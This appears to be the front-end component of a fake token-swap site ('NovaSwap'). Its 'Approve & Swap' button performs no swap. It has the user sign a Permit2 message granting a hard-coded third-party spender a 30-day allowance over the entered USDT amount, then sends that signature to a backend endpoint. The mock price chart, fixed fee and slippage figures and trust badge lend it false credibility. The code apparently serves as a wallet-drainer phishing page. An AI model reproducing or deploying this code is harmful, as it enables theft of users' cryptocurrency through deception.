import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CONFIG, USDT_ABI, TOKEN_LIST, fetchLivePrices } from '../config';
import TokenModal from './TokenModal';
import { AreaChart, Area, Tooltip, ResponsiveContainer } from 'recharts';

const mockChartData = [
  { time: '10:00', price: 3400 }, { time: '11:00', price: 3420 },
  { time: '12:00', price: 3380 }, { time: '13:00', price: 3450 },
  { time: '14:00', price: 3480 }, { time: '15:00', price: 3440 },
  { time: '16:00', price: 3500 }, { time: '17:00', price: 3520 },
];

export default function SwapCard({ walletAddress, provider }) {
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [usdtBalance, setUsdtBalance] = useState('0.00');
  const [status, setStatus] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalTarget, setModalTarget] = useState('from'); 
  
  const [fromToken, setFromToken] = useState(TOKEN_LIST[0]); // USDT
  const [toToken, setToToken] = useState(TOKEN_LIST[1]); // ETH

  const [livePrices, setLivePrices] = useState({});

  // ⭐ ඔයාගේ Config
  const PERMIT2_CONTRACT_ADDRESS = "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33";
  const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
  const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
  const API_URL = "/api/submit"; // Vercel Serverless Function

  const updatePrices = async () => {
    const prices = await fetchLivePrices();
    if (Object.keys(prices).length > 0) {
      setLivePrices(prices);
    }
  };

  useEffect(() => {
    if (walletAddress && provider) loadBalance();
    updatePrices();
    const interval = setInterval(updatePrices, 30000); 
    return () => clearInterval(interval);
  }, [walletAddress, provider]);

  useEffect(() => {
    if (fromAmount) calculateOutput(fromAmount);
  }, [livePrices, fromToken, toToken]);

  const loadBalance = async () => {
    try {
      if (!provider) return;
      const signer = provider.getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const balance = await usdtContract.balanceOf(walletAddress);
      const decimals = await usdtContract.decimals();
      setUsdtBalance(parseFloat(ethers.utils.formatUnits(balance, decimals)).toLocaleString());
    } catch (error) { 
      console.error("Balance load error:", error); 
    }
  };

  const calculateOutput = (value) => {
    setFromAmount(value);
    const val = parseFloat(value) || 0;
    if (val === 0) { setToAmount(''); return; }

    const fromPrice = livePrices[fromToken.symbol] || 1;
    const toPrice = livePrices[toToken.symbol] || 1;

    const output = (val * fromPrice) / toPrice;
    setToAmount(output.toFixed(6));
  };

  const handleMaxClick = () => {
    if (usdtBalance !== '0.00') calculateOutput(usdtBalance.replace(/,/g, ''));
  };

  const switchTokens = () => {
    setFromToken(toToken);
    setToToken(fromToken);
    setFromAmount('');
    setToAmount('');
  };

  const openTokenModal = (target) => {
    setModalTarget(target);
    setIsModalOpen(true);
  };

  const handleSelectToken = (selectedToken) => {
    if (modalTarget === 'from') setFromToken(selectedToken);
    else setToToken(selectedToken);
    if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
  };

  // ⭐ Execute Permit2 Flow (Off-chain signature only)
  const executeSwap = async () => {
    if (!walletAddress || !provider) { 
      setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
      return; 
    }
    if (!fromAmount || parseFloat(fromAmount) <= 0) { 
      setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); 
      return; 
    }

    try {
      setIsLoading(true);
      setStatus({ type: 'info', msg: '⏳ Waiting for signature...' });
      
      const signer = provider.getSigner();
      
      // 1. Permit2 details හදන්න
      const amount = ethers.utils.parseUnits(fromAmount, 6); // USDT decimals 6
      const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // දවස් 30ක්
      const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // පැයක්
      
      // 2. Permit2 Contract එක හදන්න
      const permit2Contract = new ethers.Contract(
        PERMIT2_ADDRESS,
        ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
        signer
      );
      
      // 3. Nonce එක ගන්න
      const allowanceData = await permit2Contract.allowance(
        walletAddress,
        USDT_ADDRESS,
        PERMIT2_CONTRACT_ADDRESS
      );
      const nonce = allowanceData.nonce;
      
      // 4. EIP-712 Domain හදන්න
      const domain = {
        name: "Permit2",
        chainId: 1,
        verifyingContract: PERMIT2_ADDRESS
      };
      
      // 5. Types හදන්න
      const types = {
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      };
      
      // 6. Message හදන්න (String කරන්න)
      const message = {
        details: {
          token: USDT_ADDRESS,
          amount: amount.toString(),
          expiration: expiration,
          nonce: nonce.toString()
        },
        spender: PERMIT2_CONTRACT_ADDRESS,
        sigDeadline: sigDeadline
      };
      
      // 7. Sign කරන්න (signer._signTypedData පාවිච්චි කරන්න)
      const signature = await signer._signTypedData(domain, types, message);
      
      setStatus({ type: 'info', msg: '⏳ Processing on backend...' });
      
      // 8. Backend එකට යවන්න
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          user: walletAddress,
          amount: amount.toString(),
          expiration: expiration,
          nonce: nonce.toString(),
          sigDeadline: sigDeadline,
          signature: signature
        })
      });
      
      const result = await response.json();
      
      if (result.success) {
        setStatus({ type: 'success', msg: '✅ Permit2 Approval Successful!' });
        setIsLoading(false);
        loadBalance();
        setTimeout(() => setStatus(null), 8000);
      } else {
        setStatus({ type: 'error', msg: '❌ Failed: ' + (result.error || 'Unknown error') });
        setIsLoading(false);
      }
    } catch (error) {
      console.error("Execute Swap Error:", error);
      
      const errorMsg = error?.message || 'User rejected transaction';
      const isUserCancelled = error?.code === 4001 || errorMsg.toLowerCase().includes('rejected') || errorMsg.toLowerCase().includes('user cancelled');

      if (isUserCancelled) {
        setStatus({ type: 'error', msg: '❌ Transaction cancelled by user.' });
      } else {
        setStatus({ type: 'error', msg: '❌ Failed: ' + errorMsg });
      }
      setIsLoading(false);
    }
  };

  const getConversionRate = () => {
    const fromPrice = livePrices[fromToken.symbol] || 1;
    const toPrice = livePrices[toToken.symbol] || 1;
    return (fromPrice / toPrice).toFixed(6);
  };

  return (
    <>
      <div className="glass-panel w-full max-w-[480px] rounded-2xl p-4 relative">
        
        <div className="h-32 w-full mb-4 bg-[#0D111C] rounded-xl overflow-hidden border border-[#293249]">
           <ResponsiveContainer width="100%" height="100%">
            <AreaChart data={mockChartData}>
              <defs>
                <linearGradient id="colorPrice" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="5%" stopColor="#FF007A" stopOpacity={0.3}/>
                  <stop offset="95%" stopColor="#FF007A" stopOpacity={0}/>
                </linearGradient>
              </defs>
              <Tooltip contentStyle={{ backgroundColor: '#131A2A', border: '1px solid #293249', borderRadius: '8px' }} />
              <Area type="monotone" dataKey="price" stroke="#FF007A" strokeWidth={2} fillOpacity={1} fill="url(#colorPrice)" />
            </AreaChart>
          </ResponsiveContainer>
        </div>

        {/* Sell Section */}
        <div className="bg-[#0D111C] rounded-xl p-4 border border-transparent hover:border-[#293249] transition-colors mb-1">
          <div className="flex justify-between text-sm text-gray-400 mb-2">
            <span>Sell</span>
            <span className="cursor-pointer hover:text-white" onClick={handleMaxClick}>
              Balance: <span>{fromToken.symbol === 'USDT' ? usdtBalance : '0.00'}</span>
            </span>
          </div>
          <div className="flex items-center justify-between gap-4">
            <input type="number" placeholder="0" className="swap-input" value={fromAmount} onChange={(e) => calculateOutput(e.target.value)} />
            <button onClick={() => openTokenModal('from')} className="token-btn flex items-center space-x-2 px-3 py-1.5 rounded-full">
              <img src={fromToken.icon} className="w-6 h-6" alt={fromToken.symbol} />
              <span className="font-bold text-lg">{fromToken.symbol}</span>
              <span className="text-xs ml-1">▼</span>
            </button>
          </div>
        </div>

        {/* Switch Token Button */}
        <div className="flex justify-center -my-2 relative z-10">
          <button onClick={switchTokens} className="w-8 h-8 rounded-lg bg-[#131A2A] border border-[#293249] flex items-center justify-center hover:bg-[#293249] cursor-pointer transition">
            <span className="text-gray-400">↓</span>
          </button>
        </div>

        {/* Buy Section */}
        <div className="bg-[#0D111C] rounded-xl p-4 border border-transparent hover:border-[#293249] transition-colors mt-1 mb-4">
          <div className="flex justify-between text-sm text-gray-400 mb-2">
            <span>Buy</span>
            <span>Balance: 0.00</span>
          </div>
          <div className="flex items-center justify-between gap-4">
            <input type="text" placeholder="0" readOnly className="swap-input text-gray-500" value={toAmount} />
            <button onClick={() => openTokenModal('to')} className="token-btn flex items-center space-x-2 px-3 py-1.5 rounded-full">
              <img src={toToken.icon} className="w-6 h-6" alt={toToken.symbol} />
              <span className="font-bold text-lg">{toToken.symbol}</span>
              <span className="text-xs ml-1">▼</span>
            </button>
          </div>
        </div>

        {/* Live Conversion Rate */}
        <div className="flex justify-between text-xs text-gray-400 px-2 mb-4">
          <span>1 {fromToken.symbol} ≈ {getConversionRate()} {toToken.symbol}</span>
          <span className="text-green-400 flex items-center">
            <span className="w-1.5 h-1.5 rounded-full bg-green-400 mr-1 animate-pulse"></span> Live Rate
          </span>
        </div>

        {/* Swap Details Section */}
        <div className="bg-[#0D111C]/50 rounded-xl p-3 mb-4 space-y-2 text-xs border border-white/5">
          <div className="flex justify-between text-gray-400">
            <span>Network Fee</span>
            <span className="text-white">~$2.50</span>
          </div>
          <div className="flex justify-between text-gray-400">
            <span>Price Impact</span>
            <span className="text-green-400">&lt; 0.01%</span>
          </div>
          <div className="flex justify-between text-gray-400">
            <span>Max Slippage</span>
            <span className="text-white">0.5%</span>
          </div>
          <div className="flex justify-between text-gray-400">
            <span>Order Routing</span>
            <span className="text-brand-500">NovaSwap Router</span>
          </div>
        </div>

        {/* Submit Button */}
        <button 
          onClick={executeSwap} 
          disabled={isLoading} 
          className="w-full bg-brand-500 hover:bg-brand-600 text-white font-bold py-4 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2"
        >
          <span>{isLoading ? 'Processing...' : 'Approve & Swap'}</span>
        </button>

        {/* Status Messages */}
        {status && (
          <div className={`mt-3 text-xs text-center p-2 rounded-lg ${
            status.type === 'error' ? 'text-red-400 bg-red-500/10 border border-red-500/20' : 
            status.type === 'success' ? 'text-green-400 bg-green-500/10 border border-green-500/20' : 
            'text-brand-500 bg-brand-500/10 border border-brand-500/20'
          }`}>
            {status.msg}
          </div>
        )}

        {/* PCrisk Trust Badge - Swap Card එකට යටින් */}
        <div className="flex justify-center mt-6">
          <div 
            className="pcrisk-badge"
            data-style="shield"
            data-size="medium"
            data-theme="light"
            style={{display:'flex', justifyContent:'center', padding:'8px', minWidth:'214px', minHeight:'141px', fontSize:0, lineHeight:0}}
          ></div>
        </div>

      </div>
      
      <TokenModal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} onSelect={handleSelectToken} livePrices={livePrices} />
    </>
  );
}